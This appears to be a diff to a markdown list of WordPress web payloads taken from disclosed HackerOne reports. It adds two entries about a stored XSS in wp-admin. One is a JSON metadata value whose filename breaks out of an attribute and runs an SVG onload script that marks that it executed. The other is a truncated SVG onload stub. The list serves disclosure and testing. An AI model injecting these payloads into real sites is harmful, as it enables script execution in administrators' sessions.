@@ -1,6 +1,6 @@
 # WordPress
 
-27 payloads.
+29 payloads.
 
 ### `504008e3`
 
@@ -265,3 +265,22 @@ if(document.location.hash.indexOf("secret") != -1) {
 ```
 
 — [Pivilege escalation of any new user to Keymaster caused by CSRF](https://hackerone.com/reports/2999394) · WordPress · [br3n](https://hackerone.com/br3n)
+
+### `6d810f40`
+
+```
+{"sub_sizes":[{"image_size":"thumbnail",
+  "file":"a.jpg' /><svg onload='document.title=\"XSS-EXECUTED-\"+document.domain'></svg><b x='",
+  "width":150,"height":150,"mime_type":"image/jpeg","filesize":1}]}
+```
+
+**Parameter:** `file`
+— [Author → stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`](https://hackerone.com/reports/3931771) · WordPress · [jakubk](https://hackerone.com/jakubk)
+
+### `af53af77`
+
+```
+<svg onload=…>
+```
+
+— [Author → stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`](https://hackerone.com/reports/3931771) · WordPress · [jakubk](https://hackerone.com/jakubk)
